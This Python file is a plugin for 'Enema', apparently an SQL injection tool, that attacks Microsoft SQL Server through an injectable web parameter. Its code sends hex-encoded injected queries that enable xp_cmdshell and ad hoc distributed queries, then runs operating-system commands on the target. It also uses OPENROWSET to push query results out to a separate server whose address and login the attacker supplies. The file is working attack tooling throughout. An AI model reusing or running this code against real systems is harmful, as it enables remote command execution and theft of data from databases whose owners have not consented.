"""
    Enema plugin (mssql): OPENROWSET
    Copyright (C) 2012 Valeriy Bogachuk
    
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
"""

import os
import core.txtproc
import pyodbc
from core.e_const import CONFIG_PATH
from core.http import HTTP_Handler
from PyQt4 import QtCore, QtGui

from gui.mssql.openrowset.Ui_openrowset import Ui_OpenrowsetWidget

PLUGIN_NAME = "OPENROWSET"

class OpenrowsetWidget(QtGui.QWidget):
    
    logSignal = QtCore.pyqtSignal(str)
     
    def __init__(self, vars, qstring, parent=None):
        QtGui.QWidget.__init__(self, parent, QtCore.Qt.Tool)
        self.ui = Ui_OpenrowsetWidget()
        self.ui.setupUi(self)
        self.setWindowModality(QtCore.Qt.ApplicationModal)
        self.vars = vars
        self.qstring = qstring
        self.ui.progressBar.hide()
        self.ui.openrowsetGroup.setEnabled(False)
        
        self.ui.connTestButton.clicked.connect(self.connTestButton_OnClick)
        self.ui.queryRun.clicked.connect(self.queryRun_OnClick)
        self.ui.enableButton.clicked.connect(self.enableButton_OnClick)
        self.ui.selectTOP.stateChanged.connect(self.selectTOP_StateChanged)
        self.ui.queryBox.currentIndexChanged.connect(self.queryBox_Changed)

        #Load config
        if os.path.exists(CONFIG_PATH):
            settings = QtCore.QSettings(CONFIG_PATH, QtCore.QSettings.IniFormat)
            self.ui.driverBox.setCurrentIndex(settings.value('OPENROWSET/driver', 0, int))
            self.ui.lineIP.setText(settings.value('OPENROWSET/ip', ''))
            self.ui.lineUsername.setText(settings.value('OPENROWSET/username', ''))
            self.ui.linePassword.setText(settings.value('OPENROWSET/password', ''))
            self.ui.lineDB.setText(settings.value('OPENROWSET/database', ''))
            if settings.value("Main/window_position") is not None: 
                self.move(settings.value("Main/window_position"))
        #---

    def isCmdShell(self):
        if str(self.ui.queryBox.currentText()) == "XP_CMDSHELL":
            return True
        else:
            return False
            
    #TOP checked
    def selectTOP_StateChanged(self):
        if not self.isCmdShell():
            if self.ui.selectTOP.isChecked():
                self.ui.lineTOP.setEnabled(True)
            else:
                self.ui.lineTOP.setText("")
                self.ui.lineTOP.setEnabled(False)
     
    def queryBox_Changed(self):
        if self.isCmdShell():
            self.ui.selectTOP.setEnabled(False)
            self.ui.lineTOP.setEnabled(False)
            self.ui.lineFrom.setEnabled(False)
            self.ui.selectTOP.setChecked(False)
            self.ui.lineTOP.setText("")
        else:
            self.ui.selectTOP.setEnabled(True)
            self.ui.lineFrom.setEnabled(True)
            
    def emitLog(self, logStr):
        self.logSignal.emit(logStr)
    
    #Hidding progressbar when task is done
    def taskDone(self):
        self.ui.progressBar.hide()

    #Is program busy at this moment
    def isBusy(self):
        try:
            if self.worker.isRunning():
                return True
        except AttributeError:
            return False
 
    #Add row data
    def addRowData(self,  tNum, num,  rowData):
        rData = QtGui.QTableWidgetItem()
        rData.setText(rowData)
        self.ui.tableWidget.setItem(tNum, num, rData)
   
    #Setting colored label and text (depend on connection result)
    def setConnectionStatus(self, success):
        if success:
            self.ui.statusLabel.setStyleSheet("QLabel { background-color: LightGreen }")
            self.ui.statusLabel.setText("Success")
            self.ui.openrowsetGroup.setEnabled(True)
        else:
            self.ui.statusLabel.setText("Failed")
            self.ui.statusLabel.setStyleSheet("QLabel { background-color: Red }")
            self.ui.openrowsetGroup.setEnabled(False)
            
    #Test connection button click
    def connTestButton_OnClick(self):
        if self.isBusy():
            return
        self.vars['task'] = "connection_test"
        self.vars['ip'] = self.ui.lineIP.text()
        self.vars['username'] = self.ui.lineUsername.text()
        self.vars['password'] = self.ui.linePassword.text()
        self.vars['db'] = self.ui.lineDB.text()
        self.ui.progressBar.show()
        self.worker = Worker(self.vars, self.qstring)
        #Signal connects
        self.worker.logSignal.connect(self.emitLog, type=QtCore.Qt.QueuedConnection)
        self.worker.connResultSignal.connect(self.setConnectionStatus, type=QtCore.Qt.QueuedConnection)
        self.worker.taskDoneSignal.connect(self.taskDone, type=QtCore.Qt.QueuedConnection)
        #---
        self.worker.start()

    #Enable button click
    def enableButton_OnClick(self):
        if self.isBusy():
            return
        self.vars['task'] = "enable"
        self.ui.progressBar.show()
        self.worker = Worker(self.vars, self.qstring)
        self.worker.logSignal.connect(self.emitLog, type=QtCore.Qt.QueuedConnection)
        self.worker.taskDoneSignal.connect(self.taskDone, type=QtCore.Qt.QueuedConnection)
        self.worker.start()
        
    #FTP Upload button click        
    def queryRun_OnClick(self):
        if self.isBusy():
            return
        #Adding variables from plugin widget
        self.vars['task'] = "openrowset"
        self.vars['driver'] =  str(self.ui.driverBox.currentText())
        self.vars['username'] = self.ui.lineUsername.text()
        self.vars['password'] = self.ui.linePassword.text()
        self.vars['db'] = self.ui.lineDB.text()
        self.vars['ip'] = self.ui.lineIP.text()
        self.vars['select'] = self.ui.lineSelect.text()
        self.vars['CMD'] = self.isCmdShell()
        
        if len(self.ui.lineTOP.text()) > 0:
            self.vars['TOP'] = "top " + self.ui.lineTOP.text() + " "
        else:
            self.vars['TOP'] =""
            
        if len(self.ui.lineFrom.text()) > 0:
            self.vars['from'] = " from " + self.ui.lineFrom.text()
        else:
            self.vars['from'] = ""
            
        if self.isCmdShell():
            self.vars['command'] = self.vars['select']
        else:
            if "," in self.vars['select']:
                self.vars['select'] = self.vars['select'].split(",")
            else:
                self.vars['select'] = self.ui.lineSelect.text().split()
            
        #Preparing tabWidget
        self.ui.tableWidget.clear()
        if self.isCmdShell():
            self.vars['columnsCount'] = 1
            self.vars['select'] = "result".split()
            self.ui.tableWidget.setShowGrid(False)
        else:
            self.ui.tableWidget.setShowGrid(True)
            if len(self.vars['select']) > 1:
                self.vars['columnsCount'] = len(self.vars['select'])
                self.vars['columns'] = ','.join(self.vars['select'])
            else:
                self.vars['columnsCount'] = 1
                try:
                    self.vars['columns'] = self.vars['select'][0]
                except IndexError:
                    self.logSignal.emit("[x] Can't start task. Incorect input detected.")
                    return
        self.ui.tableWidget.setColumnCount(self.vars['columnsCount'])
        self.ui.tableWidget.setHorizontalHeaderLabels(self.vars['select'])
        self.ui.tableWidget.setRowCount(int(self.ui.lineRowsCount.text()))
        self.ui.progressBar.show()
        self.worker = Worker(self.vars, self.qstring)
        
        #Signal connects
        self.worker.logSignal.connect(self.emitLog, type=QtCore.Qt.QueuedConnection)
        self.worker.rowDataSignal.connect(self.addRowData, type=QtCore.Qt.QueuedConnection)
        self.worker.connResultSignal.connect(self.setConnectionStatus, type=QtCore.Qt.QueuedConnection)
        self.worker.taskDoneSignal.connect(self.taskDone, type=QtCore.Qt.QueuedConnection)
        #---
        self.worker.start()
        
    #When widget closing
    def closeEvent(self, event):
        #Saving settings
        settings = QtCore.QSettings("settings/enema.ini", QtCore.QSettings.IniFormat)
        settings.setValue('OPENROWSET/driver', self.ui.driverBox.currentIndex())
        settings.setValue('OPENROWSET/ip', self.ui.lineIP.text())
        settings.setValue('OPENROWSET/username', self.ui.lineUsername.text())
        settings.setValue('OPENROWSET/password', self.ui.linePassword.text())
        settings.setValue('OPENROWSET/database', self.ui.lineDB.text())
        settings.sync()

    
class Worker(QtCore.QThread):

    logSignal = QtCore.pyqtSignal(str)
    rowDataSignal = QtCore.pyqtSignal(int, int, str)
    connResultSignal = QtCore.pyqtSignal(bool)
    taskDoneSignal = QtCore.pyqtSignal()
    
    def __init__(self, vars, qstring):
        QtCore.QThread.__init__(self)
        self.vars = vars
        self.qstring = qstring
        self.wq = HTTP_Handler()
        self.wq.logSignal.connect(self.log)
        #if defined non-standart sql server port
        self.connIP = self.vars['ip']
        if ":" in self.connIP:
            self.connIP = self.connIP.replace(":", ",")
        else:
            self.connIP += ",1433"
        #Connection String
        self.connStr = "DRIVER={SQL Server};SERVER=" + self.connIP + ";DATABASE="\
        + self.vars['db'] + ";UID=" + self.vars['username'] + ";PWD=" + self.vars['password']
        
    def log(self, logStr):
        self.logSignal.emit(logStr)
    
    def sqlErrorDesc(self, errMsg, errStr):
        try:
            errStr = str(errStr).encode(self.vars['encoding']).decode(self.vars['encoding'])
        except Exception:
            pass
        fullStr = errMsg + str(errStr)
        self.logSignal.emit(fullStr)
    
    def buildTable(self, isMulti, isCMD=False):
        if isMulti:
            columns = self.vars['columns'].split(",")
            column = ""
            for i in range(1, len(columns) + 1):
                column += "result" + str(i) + " varchar(8000) NULL"
                if i < len(columns):
                    column += ","
            createStr = "create table dtpropertie (" + column +  ")"
            return createStr
        else:
            createStr = "create table dtpropertie (result varchar(8000) NULL)"
        if isCMD:
            createStr = createStr.replace("dtpropertie", "dtpropertiecmd")
            #delete table if exists
            hex = core.txtproc.strToHex("drop table dtpropertiecmd", True)
            query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
            self.wq.httpRequest(query, True, self.vars)
            
            #Creating table
            hex = core.txtproc.strToHex(createStr, True)
            query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
            self.wq.httpRequest(query, True, self.vars)
            
            #Insert xp_cmdshell output to table
            hex= core.txtproc.strToHex("insert dtpropertiecmd exec master..xp_cmdshell '" + self.vars['command'] + "'", True)
            query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
            self.wq.httpRequest(query, True, self.vars)
        else:
            return createStr
    
    def run(self):
        self.logSignal.emit("+++ ["+ PLUGIN_NAME +"]: TASK STARTED +++")
        if self.vars['task'] == "connection_test":
            self.connTest()
        elif self.vars['task'] == "enable":
            self.enableFeatures()
        else:
            self.opernrowsetWorker()
        self.taskDoneSignal.emit()
        self.logSignal.emit("*** [" + PLUGIN_NAME + "]: TASK DONE ***")

    #Just connection testing
    def connTest(self):
        try:
            pyodbc.connect(self.connStr)
        except pyodbc.Error as sqlError:
            self.sqlErrorDesc("\n[x] Connection error. Task aborted.\n-----Details-----\n ", sqlError)
            self.connResultSignal.emit(False)
            return
        self.connResultSignal.emit(True)
        
    def enableFeatures(self):
        #Enbale xp_cmdshell request
        hex = core.txtproc.strToHex(\
        "sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure", True)
        query =  self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
        self.wq.httpRequest(query, True, self.vars)

        #Enbale openrowset request
        hex = core.txtproc.strToHex(\
        "sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'Ad Hoc Distributed Queries',1;reconfigure", True)
        query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
        self.wq.httpRequest(query, True, self.vars)
    
    def opernrowsetWorker(self):
        multicolumn = False
        if "," in self.vars['columns']:
            multicolumn = True
        
        if self.vars['CMD']:
            self.buildTable(False, isCMD=True)
            queryStr =  "select * from dtpropertiecmd"
            multicolumn = False
        else:
            queryStr =  "select " + self.vars['TOP'] + self.vars['columns'] + self.vars['from']
        
        openrowsetString = "insert into OPENROWSET('" + self.vars['driver'] + "',"\
        "'uid=" + self.vars['username'] + ";pwd=" + self.vars['password'] + ";"\
        "database=" + self.vars['db'] + ";Address=" + self.connIP + ";',"\
        "'select * from dtpropertie')" + queryStr

        #Connect to sql server
        try:
            conn = pyodbc.connect(self.connStr, autocommit=True)
        except pyodbc.Error as sqlError:
            self.sqlErrorDesc("\n[x] Connection error. Task aborted.\n-----Details-----\n ", sqlError)
            self.connResultSignal.emit(False)
            return
        self.connResultSignal.emit(True)
        cursor = conn.cursor()
        
        #Dropping temporary table(if exists)
        try:
            cursor.execute("drop table dtpropertie")
        except pyodbc.DatabaseError:
            pass
        
        try:
            if not multicolumn:
                #Creating temporary with 1 column
                cursor.execute(self.buildTable(False))
            else:
                #Creating temporary with several columns
                cursor.execute(self.buildTable(True))
        except pyodbc.DatabaseError:
            pass
        
        #Inserting data into sql server
        hex = core.txtproc.strToHex(openrowsetString, True)
        query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
        self.wq.httpRequest(query, True, self.vars)

        try:
            cursor.execute("select * from dtpropertie")
        except pyodbc.DatabaseError as err:
            self.sqlErrorDesc("\n[x] Error. Task aborted.\n-----Details-----\n ", err)
            return
        
        rows = cursor.fetchall()
        for x in range(self.vars['columnsCount']):
            y = 0
            for row in rows:
                self.rowDataSignal.emit(y, x, row[x])
                y += 1
            x += 1
        
        #deleting xp_cmdshell temp table
        if self.vars['CMD']:
            hex = core.txtproc.strToHex("drop table dtpropertiecmd", True)
            query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
            self.wq.httpRequest(query, True, self.vars)
            
        ##Deleting tamporaty table
       # try:
            #cursor.execute("drop table dtpropertie")
       # except pyodbc.DatabaseError:
           # pass
